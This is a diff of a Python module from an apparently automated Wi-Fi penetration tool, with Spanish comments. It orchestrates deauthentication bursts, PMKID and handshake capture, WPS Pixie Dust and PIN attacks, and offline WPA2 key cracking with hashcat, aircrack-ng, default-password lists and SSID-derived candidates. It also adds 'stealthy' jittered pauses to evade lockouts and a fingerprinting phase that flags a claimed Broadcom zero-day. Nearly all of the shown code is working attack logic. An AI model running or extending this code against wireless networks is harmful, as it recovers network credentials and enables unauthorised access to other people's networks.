@@ -22,11 +22,15 @@ from datetime import datetime
 from typing import Dict, Any, List, Optional
 
 from .models import TargetInfo, Profile, AURISScore
+from . import broadcom
 from .decision_engine import decide_path, calculate_stride_threat
 from .wids import WIDSSensor
 from .terminal import (
-    console, print_phase_start, print_phase_result,
-    print_wids_alert, spinner,
+    console,
+    print_phase_start,
+    print_phase_result,
+    print_wids_alert,
+    spinner,
 )
 from .reporter import Reporter
 
@@ -34,49 +38,91 @@ from .reporter import Reporter
 # y en sigilo; si alguna acierta se omiten WPS/diccionarios (omisión de
 # trabajo). Orden por prevalencia observada en laboratorio.
 DEFAULT_TOP20: List[str] = [
-    "12345678", "password", "123456789", "qwerty123", "1234567890",
-    "admin1234", "wifi1234", "87654321", "00000000", "11111111",
-    "12341234", "password1", "abc12345", "password123", "qwertyuiop",
-    "12344321", "adminadmin", "internet123", "cisco123", "wifi12345",
+    "12345678",
+    "password",
+    "123456789",
+    "qwerty123",
+    "1234567890",
+    "admin1234",
+    "wifi1234",
+    "87654321",
+    "00000000",
+    "11111111",
+    "12341234",
+    "password1",
+    "abc12345",
+    "password123",
+    "qwertyuiop",
+    "12344321",
+    "adminadmin",
+    "internet123",
+    "cisco123",
+    "wifi12345",
 ]
 
 # ── Timeouts por fase (segundos) ─────────────────────────────────────────────
 TIMEOUTS: Dict[str, int] = {
     "CAPTURE_HANDSHAKE": 120,
-    "CAPTURE_PMKID":     60,
-    "WPS_CLASS":         180,
-    "WPS_PIXIE":         120,
-    "PSK_DEFAULTS":      60,
-    "PSK_SSID_LOGIC":    300,
-    "PSK_ROCKYOU":       900,
-    "MGMT_AUDIT":        60,
-    "EOL_GOVERNANCE":    10,
-    "RESILIENCE_TEST":   30,
+    "CAPTURE_PMKID": 60,
+    "WPS_CLASS": 180,
+    "WPS_PIXIE": 120,
+    "PSK_DEFAULTS": 60,
+    "PSK_SSID_LOGIC": 300,
+    "PSK_ROCKYOU": 900,
+    "MGMT_AUDIT": 60,
+    "EOL_GOVERNANCE": 10,
+    "RESILIENCE_TEST": 30,
     "VALIDATE_COUNTERMEASURE": 20,
     "CLASSIFY_WEAK_CRYPTO": 5,
 }
 
 MAX_ATTEMPTS: Dict[str, int] = {
     "CAPTURE_HANDSHAKE": 3,
-    "CAPTURE_PMKID":     2,
-    "WPS_CLASS":         1,
-    "WPS_PIXIE":         1,
-    "PSK_DEFAULTS":      1,
-    "PSK_SSID_LOGIC":    2,
-    "PSK_ROCKYOU":       1,
+    "CAPTURE_PMKID": 2,
+    "WPS_CLASS": 1,
+    "WPS_PIXIE": 1,
+    "PSK_DEFAULTS": 1,
+    "PSK_SSID_LOGIC": 2,
+    "PSK_ROCKYOU": 1,
 }
 
 # Fases de ataque: una vez crackeado se omiten (wifite2 para la batería).
 ATTACK_PHASES = {
-    "CAPTURE_PMKID", "CAPTURE_HANDSHAKE", "WPS_CLASS", "WPS_PIXIE",
-    "PSK_DEFAULTS", "PSK_SSID_LOGIC", "PSK_ROCKYOU", "CLASSIFY_WEAK_CRYPTO",
+    "CAPTURE_PMKID",
+    "CAPTURE_HANDSHAKE",
+    "WPS_CLASS",
+    "WPS_PIXIE",
+    "PSK_DEFAULTS",
+    "PSK_SSID_LOGIC",
+    "PSK_ROCKYOU",
+    "CLASSIFY_WEAK_CRYPTO",
 }
+
+# Fase de evaluación (no ofensiva): fingerprint Broadcom al inicio de la ruta
+# WPS. No entra en ATTACK_PHASES: no genera credenciales ni se omite al
+# crackear; solo decide si las fases WPS tienen sentido contra este AP.
+BROADCOM_EVAL = "BROADCOM_EVAL"
+
+# Fases exclusivas de las rutas WPS: con hostapd parcheado se omiten y se
+# deja correr el resto (captura + PSK).
+WPS_ONLY_PHASES = {"WPS_CLASS", "WPS_PIXIE"}
 
 # Salidas de reaver/bully que indican lockout o rate-limit del AP.
 WPS_LOCKOUT_MARKERS = (
-    "locked", "lockout", "rate limiting", "wps transaction failed",
-    "too many", "nack", "0x02", "detected ap rate",
+    "locked",
+    "lockout",
+    "rate limiting",
+    "wps transaction failed",
+    "too many",
+    "nack",
+    "0x02",
+    "detected ap rate",
 )
+
+# Veredicto de BROADCOM_EVAL del target en curso (estado por-target:
+# run_single_target lo resetea al inicio de cada run).
+_broadcom_patched: bool = False
+_broadcom_eval: Optional[Dict[str, Any]] = None
 
 
 def _tool_available(name: str) -> bool:
@@ -100,12 +146,19 @@ def _run_tool_plain(cmd: List[str], timeout: int) -> Dict[str, Any]:
     except subprocess.TimeoutExpired:
         return {"returncode": -1, "stdout": "", "stderr": "timeout", "timed_out": True}
     except FileNotFoundError:
-        return {"returncode": -1, "stdout": "", "stderr": "tool_not_found", "timed_out": False}
+        return {
+            "returncode": -1,
+            "stdout": "",
+            "stderr": "tool_not_found",
+            "timed_out": False,
+        }
     except Exception as e:
         return {"returncode": -1, "stdout": "", "stderr": str(e), "timed_out": False}
 
 
-def _run_tool(cmd: List[str], timeout: int, desc: Optional[str] = None) -> Dict[str, Any]:
+def _run_tool(
+    cmd: List[str], timeout: int, desc: Optional[str] = None
+) -> Dict[str, Any]:
     """
     Ejecuta un subproceso con timeout.
     Con desc: muestra solo la barra de carga minimalista mientras trabaja.
@@ -116,6 +169,7 @@ def _run_tool(cmd: List[str], timeout: int, desc: Optional[str] = None) -> Dict[
 
     import threading
     from .terminal import live_task
+
     box: Dict[str, Any] = {}
     worker = threading.Thread(
         target=lambda: box.update(result=_run_tool_plain(cmd, timeout)),
@@ -129,22 +183,31 @@ def _run_tool(cmd: List[str], timeout: int, desc: Optional[str] = None) -> Dict[
             elapsed += 0.5
             tick(0.5)
     worker.join(timeout=3)
-    return box.get("result", {"returncode": -1, "stdout": "", "stderr": "timeout", "timed_out": True})
+    return box.get(
+        "result",
+        {"returncode": -1, "stdout": "", "stderr": "timeout", "timed_out": True},
+    )
 
 
 # ──────────────────────────────────────────────────────────────────────────────
 # Handlers de cada fase
 # ──────────────────────────────────────────────────────────────────────────────
 
+
 def _extract_reaver_credentials(text: str) -> Dict[str, str]:
     """Extrae WPS PIN y WPA PSK del stdout de reaver / bully / pixiewps."""
     import re
+
     creds = {}
-    pin_m = re.search(r"(?:wps pin|pin)[:\s]+['\"]?(\d{4,8})['\"]?", text, re.IGNORECASE)
+    pin_m = re.search(
+        r"(?:wps pin|pin)[:\s]+['\"]?(\d{4,8})['\"]?", text, re.IGNORECASE
+    )
     if pin_m:
         creds["pin"] = pin_m.group(1)
 
-    psk_m = re.search(r"(?:wpa psk|psk|key)[:\s]+['\"]?([^'\r\n]+)['\"]?", text, re.IGNORECASE)
+    psk_m = re.search(
+        r"(?:wpa psk|psk|key)[:\s]+['\"]?([^'\r\n]+)['\"]?", text, re.IGNORECASE
+    )
     if psk_m:
         creds["psk"] = psk_m.group(1).strip()
     return creds
@@ -169,6 +232,7 @@ def _extract_hashcat_key(hash_path: str) -> Optional[str]:
 def _parse_aircrack_key(text: str) -> Optional[str]:
     """Clave en claro desde la salida de aircrack-ng: 'KEY FOUND! [ clave ]'."""
     import re
+
     m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", text or "")
     return m.group(1).strip() if m else None
 
@@ -198,15 +262,17 @@ def _aircrack_cap(run_dir: str) -> Optional[str]:
     return None
 
 
-def _crack_with_aircrack(cap: str, wordlist: str, bssid: str,
-                         timeout: int, desc: str) -> tuple[str, Optional[str]]:
+def _crack_with_aircrack(
+    cap: str, wordlist: str, bssid: str, timeout: int, desc: str
+) -> tuple[str, Optional[str]]:
     """
     Crackeo PSK con aircrack-ng: alternativa completamente offline cuando el
     sistema no tiene hashcat (Kali mínima, sin OpenCL).
     """
     result = _run_tool(
         ["aircrack-ng", "-w", wordlist, "-b", bssid, "-q", cap],
-        timeout=timeout, desc=desc,
+        timeout=timeout,
+        desc=desc,
     )
     if result["timed_out"]:
         return "timeout", None
@@ -216,12 +282,18 @@ def _crack_with_aircrack(cap: str, wordlist: str, bssid: str,
     return "exhausted", None
 
 
-def _phase_classify_weak_crypto(target: TargetInfo) -> tuple[str, Optional[str], Optional[str]]:
+def _phase_classify_weak_crypto(
+    target: TargetInfo,
+) -> tuple[str, Optional[str], Optional[str]]:
     enc = target.encryption.upper()
     if enc in ("OPEN", "NONE"):
-        console.print("  [red]Red Abierta sin contraseña — perímetro desprotegido.[/red]")
+        console.print(
+            "  [red]Red Abierta sin contraseña — perímetro desprotegido.[/red]"
+        )
         return "cracked", "[Sin contraseña - Red Abierta]", "Red Abierta / Sin Cifrado"
-    console.print(f"  [red]Cifrado débil detectado ({target.encryption}) — documentando sin exploit.[/red]")
+    console.print(
+        f"  [red]Cifrado débil detectado ({target.encryption}) — documentando sin exploit.[/red]"
+    )
     return "class_confirmed", None, f"Cifrado débil ({target.encryption})"
 
 
@@ -248,9 +320,17 @@ def _ensure_hc22000(run_dir: str, bssid: Optional[str] = None) -> Optional[str]:
             if res["returncode"] == 0 and os.path.isfile(hash_path):
                 if bssid and _tool_available("hcxhashtool"):
                     filt = f"{run_dir}/handshake_target.hc22000"
-                    fr = _run_tool(["hcxhashtool", "-i", hash_path,
-                                    "-o", filt, f"--mac-ap={bssid}"],
-                                   timeout=30)
+                    fr = _run_tool(
+                        [
+                            "hcxhashtool",
+                            "-i",
+                            hash_path,
+                            "-o",
+                            filt,
+                            f"--mac-ap={bssid}",
+                        ],
+                        timeout=30,
+                    )
                     try:
                         if fr["returncode"] == 0 and os.path.getsize(filt) > 0:
                             os.replace(filt, hash_path)
@@ -283,10 +363,12 @@ def _deauth_burst(target: TargetInfo, iface: str, frames: int = 10) -> bool:
     return res["returncode"] == 0
 
 
-def _airodump_round(target: TargetInfo, iface: str, run_dir: str,
-                    seconds: int = 30, round_no: int = 1) -> bool:
+def _airodump_round(
+    target: TargetInfo, iface: str, run_dir: str, seconds: int = 30, round_no: int = 1
+) -> bool:
     """Ronda airodump + deauth. True si hay handshake verificado o material útil."""
     import shutil as _sh
+
     prefix = f"{run_dir}/hs_r{round_no}"
     for f in (f"{prefix}-01.cap", f"{prefix}-01.csv"):
         try:
@@ -295,9 +377,20 @@ def _airodump_round(target: TargetInfo, iface: str, run_dir: str,
             pass
     try:
         proc = subprocess.Popen(
-            ["airodump-ng", "-c", str(target.channel), "--bssid", target.bssid,
-             "-w", prefix, "--output-format", "pcap", iface],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            [
+                "airodump-ng",
+                "-c",
+                str(target.channel),
+                "--bssid",
+                target.bssid,
+                "-w",
+                prefix,
+                "--output-format",
+                "pcap",
+                iface,
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
         )
     except (OSError, FileNotFoundError):
         return False
@@ -361,12 +454,16 @@ def _target_bpf(target: "TargetInfo", run_dir: str, prefix: str) -> Optional[str
         return None
     bpf_path = os.path.join(run_dir, f"{prefix}.bpf")
     mac = target.bssid
-    filt = (f"wlan addr1 {mac} or wlan addr2 {mac} or wlan addr3 {mac} "
-            f"or (wlan type mgt and wlan subtype probe-req)")
+    filt = (
+        f"wlan addr1 {mac} or wlan addr2 {mac} or wlan addr3 {mac} "
+        f"or (wlan type mgt and wlan subtype probe-req)"
+    )
     try:
         proc = subprocess.run(
             ["tcpdump", "-i", "lo", "-ddd", filt],
-            capture_output=True, text=True, timeout=15,
+            capture_output=True,
+            text=True,
+            timeout=15,
         )
         if proc.returncode == 0 and proc.stdout.strip():
             with open(bpf_path, "w") as f:
@@ -377,8 +474,9 @@ def _target_bpf(target: "TargetInfo", run_dir: str, prefix: str) -> Optional[str
     return None
 
 
-def _hcx_capture(target: "TargetInfo", iface: str, run_dir: str,
-                 prefix: str, seconds: int, desc: str) -> tuple[bool, Dict[str, Any]]:
+def _hcx_capture(
+    target: "TargetInfo", iface: str, run_dir: str, prefix: str, seconds: int, desc: str
+) -> tuple[bool, Dict[str, Any]]:
     """Captura con sintaxis válida hcxdumptool 6.3.1.
 
     Los flags antiguos (--filterlist_ap/--filtermode/-o/--rcascan=<seg>)
@@ -388,11 +486,20 @@ def _hcx_capture(target: "TargetInfo", iface: str, run_dir: str,
     Retorna (material_capturado, result).
     """
     import math
+
     pcap_path = os.path.join(run_dir, f"{prefix}.pcapng")
     tot_min = max(1, math.ceil((seconds + 15) / 60))
-    cmd = ["hcxdumptool", "-i", iface, "-w", pcap_path,
-           "-c", _channel_arg(target.channel),
-           "--rcascan=p", f"--tot={tot_min}"]
+    cmd = [
+        "hcxdumptool",
+        "-i",
+        iface,
+        "-w",
+        pcap_path,
+        "-c",
+        _channel_arg(target.channel),
+        "--rcascan=p",
+        f"--tot={tot_min}",
+    ]
     bpf = _target_bpf(target, run_dir, prefix)
     if bpf:
         cmd.append(f"--bpf={bpf}")
@@ -408,19 +515,29 @@ def _phase_capture_pmkid(target: TargetInfo, iface: str, run_dir: str) -> str:
     attempts = MAX_ATTEMPTS.get("CAPTURE_PMKID", 2)
 
     if not _tool_available("hcxdumptool"):
-        console.print("  [yellow]hcxdumptool no disponible — omitiendo CAPTURE_PMKID[/yellow]")
+        console.print(
+            "  [yellow]hcxdumptool no disponible — omitiendo CAPTURE_PMKID[/yellow]"
+        )
         return "skipped"
 
     timeout = TIMEOUTS["CAPTURE_PMKID"] // attempts
     last = "not_found"
     for rnd in range(1, attempts + 1):
         ok, result = _hcx_capture(
-            target, iface, run_dir, "pmkid", timeout,
+            target,
+            iface,
+            run_dir,
+            "pmkid",
+            timeout,
             desc=f"Capturando PMKID {rnd}/{attempts} · {target.ssid}",
         )
         if ok:
             return "captured"
-        last = "timeout" if result["timed_out"] else ("error" if result["returncode"] != 0 else "not_found")
+        last = (
+            "timeout"
+            if result["timed_out"]
+            else ("error" if result["returncode"] != 0 else "not_found")
+        )
     return last
 
 
@@ -433,14 +550,20 @@ def _phase_capture_handshake(target: TargetInfo, iface: str, run_dir: str) -> st
 
     tools = [t for t in ("hcxdumptool", "airodump-ng") if _tool_available(t)]
     if not tools:
-        console.print("  [yellow]sin hcxdumptool ni airodump-ng — omitiendo CAPTURE_HANDSHAKE[/yellow]")
+        console.print(
+            "  [yellow]sin hcxdumptool ni airodump-ng — omitiendo CAPTURE_HANDSHAKE[/yellow]"
+        )
         return "skipped"
 
     # Ronda 1: hcxdumptool pasivo (rápido, sin inyección)
     if "hcxdumptool" in tools:
         timeout = TIMEOUTS["CAPTURE_HANDSHAKE"] // 2
         ok, result = _hcx_capture(
-            target, iface, run_dir, "handshake", timeout,
+            target,
+            iface,
+            run_dir,
+            "handshake",
+            timeout,
             desc=f"Captura pasiva 1/{attempts} · {target.ssid}",
         )
         if ok:
@@ -462,12 +585,64 @@ def _phase_capture_handshake(target: TargetInfo, iface: str, run_dir: str) -> st
     return "not_found" if _pcap_captured(pcap_path) is False else "captured"
 
 
-def _phase_wps_class(target: TargetInfo, iface: str, run_dir: str = "") -> tuple[str, Optional[str], Optional[str]]:
+def _phase_broadcom_eval(
+    target: TargetInfo, iface: str, timeout: float = 240.0
+) -> tuple[str, Optional[str], Optional[str]]:
+    """Fingerprint Broadcom (evaluación, no ataque): distingue wps_monitor de
+    hostapd parcheado antes de invertir tiempo en las fases WPS.
+
+    Nunca aborta la run: sin uv, sin fingerprinter o con fallo, registra
+    el veredicto en el side-channel y la cadena continúa.
+    """
+    global _broadcom_patched, _broadcom_eval
+    _broadcom_eval = None
+
+    if not _tool_available("uv"):
+        console.print(
+            "  [yellow][BRCM] fingerprint no disponible (uv ausente) — continuando[/yellow]"
+        )
+        return "evaluated", "", "broadcom_unavailable"
+
+    try:
+        run = broadcom.fingerprint(iface, target.ssid, timeout=timeout)
+    except broadcom.BroadcomError as exc:
+        console.print(
+            f"  [yellow][BRCM] fingerprint fallo: {exc} — continuando[/yellow]"
+        )
+        return "evaluated", "", "broadcom_unavailable"
+
+    _broadcom_eval = {
+        "assessment": run.assessment,
+        "model": run.model,
+        "warning": run.warning,
+        "evidence": tuple(run.evidence)[:3],
+    }
+
+    if run.assessment == "PATCHED_HOSTAPD":
+        _broadcom_patched = True
+        console.print(
+            "  [green][BRCM] hostapd parcheado — fases WPS omitidas; "
+            "se evalua la ruta PSK restante[/green]"
+        )
+        return "determined", "", "patched_hostapd"
+
+    console.print(
+        "  [yellow][BRCM] zero-day BRCM (EAP fragment reassembly) aplicable — "
+        "se continua la cadena WPS[/yellow]"
+    )
+    return "determined", "", "zero_day_wps_broadcom"
+
+
+def _phase_wps_class(
+    target: TargetInfo, iface: str, run_dir: str = ""
+) -> tuple[str, Optional[str], Optional[str]]:
     """Valida la clase WPS con reaver/bully (pixie dust + pin class)."""
     timeout = TIMEOUTS["WPS_CLASS"]
 
     if not _tool_available("reaver") and not _tool_available("bully"):
-        console.print("  [yellow]reaver/bully no disponibles — WPS_CLASS degradado[/yellow]")
+        console.print(
+            "  [yellow]reaver/bully no disponibles — WPS_CLASS degradado[/yellow]"
+        )
         return "skipped", None, None
 
     tool = "reaver" if _tool_available("reaver") else "bully"
@@ -489,14 +664,22 @@ def _phase_wps_class(target: TargetInfo, iface: str, run_dir: str = "") -> tuple
         creds = _extract_reaver_credentials(result["stdout"])
         pin = creds.get("pin")
         psk = creds.get("psk")
-        val = f"PIN: {pin} | PSK: {psk}" if psk and pin else (f"PIN: {pin}" if pin else (psk or "PIN de clase predecible detectado"))
+        val = (
+            f"PIN: {pin} | PSK: {psk}"
+            if psk and pin
+            else (
+                f"PIN: {pin}" if pin else (psk or "PIN de clase predecible detectado")
+            )
+        )
         return "class_confirmed", val, "WPS PIN (Clase conocida)"
     if run_dir:
         _save_stderr(run_dir, "wps_class", result)
     return "not_found", None, None
 
 
-def _phase_wps_pixie(target: TargetInfo, iface: str, run_dir: str = "") -> tuple[str, Optional[str], Optional[str]]:
+def _phase_wps_pixie(
+    target: TargetInfo, iface: str, run_dir: str = ""
+) -> tuple[str, Optional[str], Optional[str]]:
     """Pixie Dust WPS (solo WPS v1). reaver -K 1 (usa pixiewps) o bully -d."""
     timeout = TIMEOUTS["WPS_PIXIE"]
     if _tool_available("reaver"):
@@ -510,7 +693,9 @@ def _phase_wps_pixie(target: TargetInfo, iface: str, run_dir: str = "") -> tuple
         return "skipped", None, None
 
     if not _tool_available("pixiewps"):
-        console.print("  [yellow]pixiewps ausente — el ataque Pixie Dust no puede completarse[/yellow]")
+        console.print(
+            "  [yellow]pixiewps ausente — el ataque Pixie Dust no puede completarse[/yellow]"
+        )
 
     result = _run_tool(
         cmd,
@@ -528,7 +713,11 @@ def _phase_wps_pixie(target: TargetInfo, iface: str, run_dir: str = "") -> tuple
         creds = _extract_reaver_credentials(result["stdout"])
         pin = creds.get("pin")
         psk = creds.get("psk")
-        val = f"PIN: {pin} | PSK: {psk}" if psk and pin else (f"PIN: {pin}" if pin else (psk or "PIN/PSK recuperado"))
+        val = (
+            f"PIN: {pin} | PSK: {psk}"
+            if psk and pin
+            else (f"PIN: {pin}" if pin else (psk or "PIN/PSK recuperado"))
+        )
         return "cracked", val, "WPS Pixie Dust"
     if run_dir:
         _save_stderr(run_dir, "wps_pixie", result)
@@ -540,6 +729,7 @@ def extract_reusable_psk(recovered_key: Optional[str]) -> Optional[str]:
     if not recovered_key:
         return None
     import re
+
     m = re.search(r"PSK\s*:\s*([^|]+)", recovered_key, re.IGNORECASE)
     if m:
         return m.group(1).strip().strip("'\"")
@@ -551,6 +741,7 @@ def extract_reusable_psk(recovered_key: Optional[str]) -> Optional[str]:
 def ssid_family_base(ssid: str) -> str:
     """Base de familia: quita sufijos de AP hermano (_2, -3, _5G, _PLUS, _EXT, ...)."""
     import re
+
     base = (ssid or "").strip()
     m = re.search(r"(?i)([ _.\-]?(2|3|4|5|plus|5g|2g|ext|guest|iot|2\.4g))$", base)
     if m and len(base) - len(m.group(0)) >= 3:
@@ -561,8 +752,22 @@ def ssid_family_base(ssid: str) -> str:
 def _mutate_family_key(key: str) -> List[str]:
     """Mutaciones de una clave de AP hermano (caso X='wifi@2026@' → X2='wifi@2026@1/2')."""
     import re
+
     out: List[str] = []
-    for t in ("1", "2", "3", "12", "123", "2024", "2025", "2026", "_1", "-1", "!", "@1"):
+    for t in (
+        "1",
+        "2",
+        "3",
+        "12",
+        "123",
+        "2024",
+        "2025",
+        "2026",
+        "_1",
+        "-1",
+        "!",
+        "@1",
+    ):
         out.append(f"{key}{t}")
     m = re.search(r"(\d+)([^0-9]*)$", key)
     if m:
@@ -614,11 +819,29 @@ def generate_ssid_candidates(
                 case_forms.append(v)
 
     years = [str(y) for y in range(2018, 2027)]
-    tails = ["1", "2", "3", "01", "02", "123", "1234", "12345",
-             "007", "000", "111", "999",
-             "wifi", "admin", "internet", "casa", "hogar", "router"]
+    tails = [
+        "1",
+        "2",
+        "3",
+        "01",
+        "02",
+        "123",
+        "1234",
+        "12345",
+        "007",
+        "000",
+        "111",
+        "999",
+        "wifi",
+        "admin",
+        "internet",
+        "casa",
+        "hogar",
+        "router",
+    ]
     try:
         from .vendor_profiles import ISP_TOKENS
+
         tails = tails + [t for t in ISP_TOKENS if t not in tails]
     except ImportError:
         pass
@@ -627,7 +850,13 @@ def generate_ssid_candidates(
     lote1: List[str] = list(exact)
 
     def add(lst: List[str], c: str):
-        if c and len(c) >= 8 and c not in lote1 and c not in lst and len(lote1) + len(lst) < max_candidates:
+        if (
+            c
+            and len(c) >= 8
+            and c not in lote1
+            and c not in lst
+            and len(lote1) + len(lst) < max_candidates
+        ):
             lst.append(c)
 
     base_part: List[str] = []
@@ -640,20 +869,33 @@ def generate_ssid_candidates(
             add(base_part, f"{base}@{y}@")
             add(base_part, f"{base}#{y}")
     lote1.extend(base_part)
-    for generic in ("password", "12345678", "87654321", "admin1234", "wifi1234", "qwerty123"):
+    for generic in (
+        "password",
+        "12345678",
+        "87654321",
+        "admin1234",
+        "wifi1234",
+        "qwerty123",
+    ):
         if generic not in lote1:
             lote1.append(generic)
 
     if bssid:
-        frags = {bssid.replace(":", "").replace("-", "").upper()[-6:],
-                 bssid.replace(":", "").replace("-", "").upper()[-4:]}
+        frags = {
+            bssid.replace(":", "").replace("-", "").upper()[-6:],
+            bssid.replace(":", "").replace("-", "").upper()[-4:],
+        }
         for frag in frags:
             if not frag:
                 continue
             for v in (frag, frag.lower()):
                 for base in case_forms[:2]:
                     for c in (f"{base}{v}", f"{base}_{v}"):
-                        if len(c) >= 8 and c not in lote1 and len(lote1) < max_candidates:
+                        if (
+                            len(c) >= 8
+                            and c not in lote1
+                            and len(lote1) < max_candidates
+                        ):
                             lote1.append(c)
 
     # lote2: mutaciones (solo si hay claves de hermanos)
@@ -672,7 +914,8 @@ def generate_ssid_candidates(
 
 
 def _phase_psk_ssid_logic(
-    target: TargetInfo, run_dir: str,
+    target: TargetInfo,
+    run_dir: str,
     family_keys: Optional[Dict[str, str]] = None,
 ) -> tuple[str, Optional[str], Optional[str]]:
     """Ataca PSK offline: lote1 (SSID+reutilización) y reintento lote2 (mutaciones familia)."""
@@ -685,7 +928,9 @@ def _phase_psk_ssid_logic(
         f.write("\n".join(lote1))
 
     n_fam = sum(1 for c in lote1 if family_keys and c in (family_keys or {}).values())
-    console.print(f"  [dim]Wordlist SSID lógica → {len(lote1)} candidatos ({n_fam} por reutilización de familia)[/dim]")
+    console.print(
+        f"  [dim]Wordlist SSID lógica → {len(lote1)} candidatos ({n_fam} por reutilización de familia)[/dim]"
+    )
 
     hash_path = _ensure_hc22000(run_dir) or f"{run_dir}/handshake.hc22000"
 
@@ -693,13 +938,20 @@ def _phase_psk_ssid_logic(
         # Sin hashcat (Kali mínima sin OpenCL): aircrack-ng con los mismos lotes.
         cap = _aircrack_cap(run_dir) if _tool_available("aircrack-ng") else None
         if not cap:
-            console.print("  [yellow]Sin hashcat ni .cap utilizable — PSK_SSID_LOGIC degradado[/yellow]")
+            console.print(
+                "  [yellow]Sin hashcat ni .cap utilizable — PSK_SSID_LOGIC degradado[/yellow]"
+            )
             return "skipped", None, None
-        console.print("  [dim]hashcat ausente → crackeando con aircrack-ng (offline)[/dim]")
+        console.print(
+            "  [dim]hashcat ausente → crackeando con aircrack-ng (offline)[/dim]"
+        )
         with open(wl1, "w") as f:
             f.write("\n".join(lote1))
         r, key = _crack_with_aircrack(
-            cap, wl1, target.bssid, min(120, TIMEOUTS["PSK_SSID_LOGIC"]),
+            cap,
+            wl1,
+            target.bssid,
+            min(120, TIMEOUTS["PSK_SSID_LOGIC"]),
             f"aircrack-ng {len(lote1)} claves · {target.ssid}",
         )
         if r == "cracked":
@@ -708,7 +960,10 @@ def _phase_psk_ssid_logic(
             with open(wl2, "w") as f:
                 f.write("\n".join(lote2))
             r2, key2 = _crack_with_aircrack(
-                cap, wl2, target.bssid, 60,
+                cap,
+                wl2,
+                target.bssid,
+                60,
                 f"aircrack-ng {len(lote2)} variantes · {target.ssid}",
             )
             if r2 == "cracked":
@@ -716,7 +971,9 @@ def _phase_psk_ssid_logic(
         return r, None, None
 
     if not os.path.isfile(hash_path):
-        console.print("  [yellow]No hay hash capturado — ejecutar CAPTURE primero[/yellow]")
+        console.print(
+            "  [yellow]No hay hash capturado — ejecutar CAPTURE primero[/yellow]"
+        )
         return "skipped", None, None
 
     budget = TIMEOUTS["PSK_SSID_LOGIC"]
@@ -743,13 +1000,17 @@ def _phase_psk_ssid_logic(
 
     attempts = MAX_ATTEMPTS.get("PSK_SSID_LOGIC", 2)
     if r == "exhausted" and lote2 and attempts > 1:
-        console.print(f"  [dim]Reintento 2/{attempts} con {len(lote2)} variantes de familia...[/dim]")
+        console.print(
+            f"  [dim]Reintento 2/{attempts} con {len(lote2)} variantes de familia...[/dim]"
+        )
         return _try(lote2, wl2, max(budget - t1, 30), "Lógica SSID familia")
 
     return r, None, None
 
 
-def _phase_psk_defaults(target: TargetInfo, run_dir: str) -> tuple[str, Optional[str], Optional[str]]:
+def _phase_psk_defaults(
+    target: TargetInfo, run_dir: str
+) -> tuple[str, Optional[str], Optional[str]]:
     """Fast-pass sigiloso Top-20: 20 claves por error humano más comunes.
 
     Comportamiento (petición laboratorio):
@@ -767,9 +1028,13 @@ def _phase_psk_defaults(target: TargetInfo, run_dir: str) -> tuple[str, Optional
             f.write("\n".join(DEFAULT_TOP20))
     except OSError:
         pass
-    console.print(f"  [dim]Top-20 defaults · {target.ssid} (sigiloso: 2×10, pausa con jitter; omite resto si acierta)[/dim]")
+    console.print(
+        f"  [dim]Top-20 defaults · {target.ssid} (sigiloso: 2×10, pausa con jitter; omite resto si acierta)[/dim]"
+    )
 
-    hash_path = _ensure_hc22000(run_dir, target.bssid) or os.path.join(run_dir, "handshake.hc22000")
+    hash_path = _ensure_hc22000(run_dir, target.bssid) or os.path.join(
+        run_dir, "handshake.hc22000"
+    )
     has_hash = os.path.isfile(hash_path) and os.path.getsize(hash_path) > 0
     cap = _aircrack_cap(run_dir) if _tool_available("aircrack-ng") else None
 
@@ -792,7 +1057,8 @@ def _phase_psk_defaults(target: TargetInfo, run_dir: str) -> tuple[str, Optional
             # Sigiloso: --quiet, sin --status, sin desc → sin barra ruidosa.
             result = _run_tool(
                 ["hashcat", "-m", "22000", hash_path, batch_path, "--quiet"],
-                timeout=30, desc=None,
+                timeout=30,
+                desc=None,
             )
             if result["timed_out"]:
                 _save_stderr(run_dir, f"defaults_b{idx}", result)
@@ -805,7 +1071,11 @@ def _phase_psk_defaults(target: TargetInfo, run_dir: str) -> tuple[str, Optional
                 _save_stderr(run_dir, f"defaults_b{idx}", result)
         elif cap:
             r, key = _crack_with_aircrack(
-                cap, batch_path, target.bssid, timeout=30, desc=None,
+                cap,
+                batch_path,
+                target.bssid,
+                timeout=30,
+                desc=None,
             )
             if r == "cracked":
                 return "cracked", key, "WPA2-PSK (Top-20 defaults, aircrack-ng)"
@@ -819,19 +1089,26 @@ def _phase_psk_defaults(target: TargetInfo, run_dir: str) -> tuple[str, Optional
             # Pausa 2-4s + jitter 0-1s entre lotes (sigilo / anti-baneo).
             jitter = random.uniform(0, 1.0)
             pause = 2.0 + random.uniform(0, 2.0) + jitter
-            console.print(f"  [dim]pausa sigilosa {pause:.1f}s antes del lote {idx+1}/2[/dim]")
+            console.print(
+                f"  [dim]pausa sigilosa {pause:.1f}s antes del lote {idx + 1}/2[/dim]"
+            )
             time.sleep(pause)
 
     return last, None, None
 
 
-def _phase_psk_rockyou(target: TargetInfo, run_dir: str) -> tuple[str, Optional[str], Optional[str]]:
+def _phase_psk_rockyou(
+    target: TargetInfo, run_dir: str
+) -> tuple[str, Optional[str], Optional[str]]:
     """Ataca PSK con rockyou.txt (del sistema o del bundle offline)."""
     from .wordlists import find_rockyou
     from .roe import PROJECT_DIR as _PROJECT_DIR
+
     rockyou = find_rockyou(_PROJECT_DIR) or "/usr/share/wordlists/rockyou.txt"
     if not rockyou or not os.path.isfile(rockyou):
-        console.print("  [yellow]rockyou.txt no disponible — omitiendo PSK_ROCKYOU[/yellow]")
+        console.print(
+            "  [yellow]rockyou.txt no disponible — omitiendo PSK_ROCKYOU[/yellow]"
+        )
         return "skipped", None, None
 
     hash_path = _ensure_hc22000(run_dir) or f"{run_dir}/handshake.hc22000"
@@ -841,9 +1118,14 @@ def _phase_psk_rockyou(target: TargetInfo, run_dir: str) -> tuple[str, Optional[
         cap = _aircrack_cap(run_dir) if _tool_available("aircrack-ng") else None
         if not cap:
             return "skipped", None, None
-        console.print("  [dim]hashcat ausente → rockyou con aircrack-ng (offline)[/dim]")
+        console.print(
+            "  [dim]hashcat ausente → rockyou con aircrack-ng (offline)[/dim]"
+        )
         r, key = _crack_with_aircrack(
-            cap, rockyou, target.bssid, TIMEOUTS["PSK_ROCKYOU"],
+            cap,
+            rockyou,
+            target.bssid,
+            TIMEOUTS["PSK_ROCKYOU"],
             f"aircrack-ng rockyou · {target.ssid}",
         )
         if r == "cracked":
